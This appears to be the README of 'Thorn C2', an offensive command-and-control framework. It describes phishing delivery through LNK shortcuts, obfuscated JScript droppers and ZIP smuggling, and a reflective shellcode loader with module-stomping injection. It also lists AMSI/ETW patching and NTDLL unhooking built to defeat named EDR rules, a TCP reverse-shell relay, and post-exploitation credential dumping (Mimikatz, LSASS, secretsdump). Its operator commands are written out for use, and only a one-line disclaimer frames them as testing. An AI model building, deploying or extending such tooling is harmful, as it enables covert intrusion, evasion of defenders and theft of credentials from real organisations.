# Thorn C2

A modular command and control framework with a component-based payload pipeline, interactive operator console, and pluggable transport channels.

---

## Features

- **Component-based payload assembly** — swap crypto, channel, evasion, and execution components independently per build; assembler merges dependencies and compiles automatically
- **Build profiles** — one-click component selection for common build goals; add your own in `builder/profiles.json`
- **Multiple transport channels** — HTTP (WinHTTP, no reqwest/tokio) and DNS TXT; additional channels drop in without touching the core
- **Multi-language implants and stations** — Rust (compiled, Windows x64), Python, PowerShell, Ruby
- **AES-256-CBC encrypted comms** — station handles encrypt/decrypt; Thorn API speaks plaintext internally
- **ThornLDR shellcode delivery** — PE → shellcode via custom reflective loader; module stomping hides implant in legitimate DLL .text (MEM\_IMAGE backed, no unbacked RX)
- **Modular inject pool** — section-map, remote module stomp, or spawn+stomp; swapped per-profile without touching stager code
- **Phishing delivery** — LNK shortcut generation, obfuscated JScript dropper, ZIP smuggling (shellcode injected between file data and Central Directory)
- **Extensible module system** — drop in a `manifest.js` + `TaskHandler.js` to add new task types; reload without restart
- **TCP reverse shell** — interactive shell via station relay; no polling latency
- **Traffic cover** — HTTP station masquerades as nginx, redirects all non-beacon traffic to a configurable URL
- **Multi-user operator console** — per-user API keys, per-implant access control, engagement log and markdown report export
- **Local or server build** — compile Rust payloads in-process (no commit/pull cycle needed) or queue jobs on the C2 server

---

## Architecture

```
Operator  (thorn.py)
    │  HTTPS + per-user API key
    ▼
Caddy  (443)  ←  TLS termination, reverse proxy
    │
Thorn API  (index.js : 1337)  ←→  SQLite
    │  plaintext  task_id:base64(payload)
    ▼
Station  (port 80/HTTP  +  port 4444/TCP relay)
    │  AES-256-CBC encrypted (HTTP)
    ▼
Implant  (running inside stomped xpsservices.dll .text via thornldr_stager)
```

**Delivery chain:**

```
ZIP (phishing) → thornldr_stager.exe
    → decrypts THORNPLD blob (AES-256-CBC)
    → applies ThornLDR XOR decoder patch
    → [module_stomp]  force-loads xpsservices.dll into target process,
                      writes shellcode over .text, kicks thread
      [spawn_stomp]   CreateProcessW(RuntimeBroker.exe, SUSPENDED),
                      stomps xpsservices.dll inside child, resumes
    → ThornLDR blob reflectively loads implant PE
    → cleanup_loader_blob() frees loader shellcode region
    → implant beacons to station
```

The TCP relay runs as a second listener on the station. For interactive shells, thorn connects first and presents a 4-byte session token; the implant connects second with the same token; the relay bridges both sides so neither party needs a direct route to the other.

---

## Quick Start (Development)

**Requirements:** Node.js 18.13, Python 3.8+, Docker

**1. Install Node.js 18.13:**

```bash
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs
```

**2. Install Docker:**

```bash
sudo apt install -y docker.io
```

**3. Clone and install dependencies:**

```bash
git clone <repo>
cd ThornC2
npm install
```

**4. Set up Python virtual environment:**

```bash
python3 -m venv .thorn
source .thorn/bin/activate
pip install -r requirements.txt
```

Create `.env` in the project root:

```env
API_KEY=<random-string>      # bootstrap admin key
SOCKET_KEY=<random-string>   # socket.io auth token
```

Generate strong values with:

```bash
node -e "const {randomBytes}=require('crypto'); console.log(randomBytes(32).toString('hex'))"
```

Start the API:

```bash
node index.js
```

Connect the CLI:

```bash
python3 thorn.py
thorn » config http://localhost:1337 <API_KEY>
```

---

## Quick Start (Operator — CLI Only)

If the C2 server is already running and you just need to connect as an operator, you only need Python.

**Requirements:** Python 3.8+

```bash
git clone <repo>
cd ThornC2
python3 -m venv .thorn
source .thorn/bin/activate
pip install -r requirements.txt
python3 thorn.py
```

Connect to the server:

```
thorn » config https://c2.example.com <your-api-key>
```

Your admin gives you an API key via `useradd <you>` on their end. Once connected:

```
thorn » rats                         list active implants
thorn » use <rat_id>                 enter rat context
thorn [rat] » command "whoami"       dispatch a shell command
thorn [rat] » run <#|module_id>      run any module (tab-complete or use modules to list)
thorn [rat] » tasks                  show task history
thorn [rat] » output <task_id>       retrieve task output
thorn [rat] » sysinfo                dump process/user/OS info
thorn [rat] » shell <host:port>      open interactive reverse shell via TCP relay
thorn [rat] » back                   return to global context
```

View engagement log and export a report:

```
thorn » log
thorn » report
```

---

## Production Deployment (Caddy + TLS)

Caddy terminates TLS and reverse-proxies to the Node API. A custom build with the Gandi DNS plugin is required for wildcard certificate issuance.

**1. Build the Caddy image:**

```bash
docker build -t caddy-gandi .
```

The Dockerfile pins `caddy:2.8.4` and `github.com/caddy-dns/gandi@v1.0.3` — the last combination compatible with Go 1.23.

**2. Configure the Caddyfile:**

Edit `Caddyfile` and replace the placeholder values:

```
c2.example.com *.c2.example.com {
    tls {
        dns gandi <your-gandi-api-key>
    }
    import proxy_upstream
}
```

**3. Start Caddy:**

```bash
docker run --network=host \
  -v $PWD/Caddyfile:/etc/caddy/Caddyfile \
  -v caddy_data:/data \
  caddy-gandi
```

`--network=host` is required so Caddy can reach Node on `localhost:1337`. Port 443 binds directly to the host. Port 80 is not used (DNS challenge handles cert issuance; HTTP redirect is disabled).

**4. Start the API and connect:**

```bash
node index.js
python3 thorn.py
thorn » config https://c2.example.com <API_KEY>
```

---

## Multi-User Mode

Each operator gets their own API key. The bootstrap `API_KEY` from `.env` always has full admin access.

```
useradd alice             create operator, prints API key once
userdel alice             delete operator
users                     list operators and their implant access
grant alice TargetOp      give alice access to rats from implant ID TargetOp
revoke alice TargetOp     remove access
```

Alice connects with:

```
thorn » config https://c2.example.com <alice-api-key>
```

Operators without a grant for a given implant ID cannot see, task, or delete its rats.

Each operator can configure their own Telegram notifications:

```
thorn » telegram <bot_token> <chat_id>    enable — notified on new rat check-ins you can access
thorn » telegram off                      disable
```

---

## Building Payloads

Rust implants and stagers target Windows x64. Install the cross-compilation toolchain on the build machine (C2 server or local):

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt install mingw-w64
```

By default, Rust compile jobs are queued on the C2 server and artifacts are downloaded to `backdoors/` automatically. To compile locally instead (useful when iterating without committing and pulling):

```
build local on            compile on this machine  (requires Rust toolchain)
build local off           submit jobs to the C2 server  (default)
build local status        show current setting
```

From the CLI:

```
build show                    show current config + component selections
build config                  set AES key, IV, station URL, C2 URL, relay port, filenames, implant ID
build implant <language>      build implant  (rust: compiled; python/powershell: assembled locally)
build stager <language>       build stager   (rust: compiled)
build station                 assemble station from component snippets
build zip                     queue full pipeline + ZIP packaging
build jscript                 generate obfuscated JScript stager  (local)
build lnk                     generate LNK phishing shortcut  (local)
build encrypt <file>          AES-encrypt a shellcode file for shellcode_load
build deliver                 push stager to active rat via PowerShell
build thornldr                recompile ThornLDR stub (clears cache)
```

When building a Rust stager or implant, the CLI prompts for a **build profile** first. Profiles pre-select a component stack for a given build goal. See `builder/profiles.json` for bundled examples — edit the file to add your own.

Select **Advanced** to choose individual components manually.

`build config` prompts for several fields:
- **Station URL** — base URL for all payload delivery (stager/implant download paths derived from this)
- **Implant URL** — what the implant beacons to (usually the same as station)
- **C2 URL** — what the station calls back to (the Thorn API address)
- **Relay port** — TCP port on the station for reverse shell sessions (default `4444`)
- **Cover redirect** — URL non-beacon traffic is 301'd to (default `https://www.microsoft.com`)

---

## DNS Channel

The DNS TXT channel tunnels C2 traffic through TXT record queries. Setup requires delegating a subdomain's NS record to your server:

```
c2.example.com.      NS   ns1.c2.example.com.
ns1.c2.example.com.  A    <your-c2-ip>
```

Install the extra dependency, generate the station, and build the implant with the DNS TXT channel selected at the component picker:

```bash
pip install dnslib
```

```
build config                  set Station base URL → c2.example.com
build station                 select Python station, DNS TXT channel, enter domain + Thorn API URL
build implant rust            select DNS TXT channel at component picker
sudo python3 backdoors/stations/station_python_<ts>.py
```

---

## Component System

Payloads are assembled from components in `code_snippets/`. Each component is a directory containing a `manifest.js` and a source file.

**Implant assembly order:** `config → crypto → channel → sleep → evasion → execution → main`

**Station assembly order:** `station_crypto → station_channel`

Adding a new component means creating a new directory with a `manifest.js`. The assembler discovers it automatically and presents it as a selectable option at build time. Selecting `None` for a slot skips that component.

**Available channels:**

| Channel | Transport | Implant | Station |
|---------|-----------|---------|---------|
| `http_winhttp` | HTTP | Rust | Python |
| `dns_txt` | DNS TXT | Rust | Python |

**Available evasion components** (multiple can be selected, combined into a single `evasion.rs`):

| Component | Technique |
|-----------|-----------|
| `none` | Stub — no evasion |
| `amsi_etw_ntdll` | ETW patch + NTDLL unhook via disk mapping |
| `amsi_etw_patch` | AMSI OpenSession patch + ETW patch |
| `ntdll_unhook` | NTDLL unhook via fresh disk copy |
| `etw_hwbp` | ETW bypass via DR0 hardware breakpoint on EtwEventWrite + VEH — no ntdll patching |
| `anti_debug` | Debugger and hardware breakpoint detection |
| `anti_sandbox_hammer` | I/O and CPU anti-sandbox timing |
| `block_dll_policy` | Block non-Microsoft DLL injection |
| `self_delete` | Delete the stager binary on execution |

**Available stager variants:**

| Stager | Description |
|--------|-------------|
| `thornldr_stager` | `no_std` no-CRT Rust PE stager; scans ZIP files for THORNPLD magic, decrypts blob, runs inject pool variant. Minimal IAT defeats static ML classifiers. |
| `dynamic_inject` | Enumerates running processes, picks from candidate list, injects shellcode |
| `ppid_spoof` | Spawns a target process with spoofed PPID and injects |
| `process_injection` | Direct process injection without PPID spoofing |
| `direct_exec` | Executes shellcode directly in the current process |

**Inject pool** (`thornldr_stager` only — swap without changing stager code):

| Variant | Technique | Defeats |
|---------|-----------|---------|
| `section_map` | NtCreateSection (page-file backed) + NtMapViewOfSection — no cross-process write | Basic injection detection |
| `module_stomp` | Force-loads xpsservices.dll into target, writes shellcode over .text | Memory scanners (MEM\_IMAGE backed, no unbacked RX) |
| `spawn_stomp` | Spawns RuntimeBroker.exe as a child, stomps xpsservices.dll inside it | Elastic "Process Memory Write to Non Child Process" behavioral rule |

---

## ThornLDR

ThornLDR is the custom reflective PE loader embedded as shellcode inside every Rust implant build. It loads the implant PE from its own memory without touching the filesystem.

After loading, ThornLDR writes a `THORNBLB` info block at the start of the stomped module (xpsservices.dll base) containing the base address and total size of the loader shellcode region. The implant reads this at startup and frees the region via `cleanup_loader_blob()`, eliminating the residual private RX memory that memory scanners flag.

Recompile the stub after changing `tools/thornldr/src/`:

```
build thornldr
```

---

## Module System

Modules extend what tasks the API can dispatch. They live in `code_snippets/modules/<task_type>/<name>/` and consist of a `manifest.js` and a `TaskHandler.js`.

Run `reload` in the CLI to pick up new modules without restarting the server.

---

## Post-Exploitation Setup

The `post` CLI commands wrap impacket for operator-side attacks (secretsdump, kerberoast, psexec, wmiexec, etc.). Install impacket:

```bash
pip install impacket
```

The PowerShell modules (Mimikatz, Kerberoast, SharpHound, Portscan, PowerUpSQL, LSASS dump) run in-memory on the implant via the `powershell_clr` execution component. They require the corresponding PS1 scripts in `code_snippets/tools/original/pwsh/`. These are not distributed with this repo — download them yourself:

| Script | Source |
|--------|--------|
| `Invoke-Mimikatz.ps1` | [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) |
| `Invoke-Kerberoast.ps1` | [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) |
| `Sharphound.ps1` | [BloodHound](https://github.com/BloodHoundAD/BloodHound) |
| `Invoke-Portscan.ps1` | [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) |
| `PowerUpSQL.ps1` | [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) |
| `Out-MiniDump.ps1` | [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) |

Place them in `code_snippets/tools/original/pwsh/` and the CLI will find them automatically.

---

## Disclaimer

For authorized security testing and research only.
